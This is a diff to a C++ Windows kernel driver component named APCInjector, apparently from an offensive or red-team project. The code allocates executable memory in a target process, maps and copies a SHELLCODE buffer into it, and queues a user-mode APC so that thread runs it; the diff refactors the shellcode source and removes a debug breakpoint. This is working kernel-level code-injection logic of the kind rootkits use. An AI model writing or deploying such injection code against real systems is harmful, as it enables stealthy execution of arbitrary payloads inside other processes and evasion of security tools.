@@ -2,9 +2,8 @@
 #include "../../lib/Symbols.h"
 #include "APCInjector.h"
 
-APCInjector::APCInjector(Process& process, NonPagedBuffer& shellcode)
+APCInjector::APCInjector(Process& process)
 	: m_process(process)
-	, m_shellcode(shellcode)
 {}
 
 NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
@@ -67,7 +66,7 @@ NTSTATUS APCInjector::queueKernelApc() {
 
 void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
 	void* shellcodeAddress = nullptr;
-	size_t shellcodeSize = sizeof(shellcodeHandler::injectedShellcode);
+	size_t shellcodeSize = sizeof(SHELLCODE);
 
 	auto status = ZwAllocateVirtualMemory(
 		NtCurrentProcess(),
@@ -78,7 +77,7 @@ void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
 		PAGE_EXECUTE_READ
 	);
 
-	auto mdl = IoAllocateMdl(shellcodeAddress, sizeof(shellcodeHandler::injectedShellcode), false, false, nullptr);
+	auto mdl = IoAllocateMdl(shellcodeAddress, sizeof(SHELLCODE), false, false, nullptr);
 
 	if (!mdl) {
 		KdPrint(("[-] Could not allocate a MDL.\n"));
@@ -113,14 +112,13 @@ void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
 		return;
 	}
 
-	RtlCopyMemory(mappedAddress, shellcodeHandler::injectedShellcode, shellcodeSize);
+	RtlCopyMemory(mappedAddress, SHELLCODE, shellcodeSize);
 
 	MmUnmapLockedPages(mappedAddress, mdl);
 	MmUnlockPages(mdl);
 	IoFreeMdl(mdl);
 
 	const auto currentThread = Thread(HandleToUlong(PsGetCurrentThreadId()));
-	__debugbreak();
 	auto apc = Apc(reinterpret_cast<PKNORMAL_ROUTINE>(shellcodeAddress), currentThread, OriginalApcEnvironment, UserMode);
 	apc.queue();
 
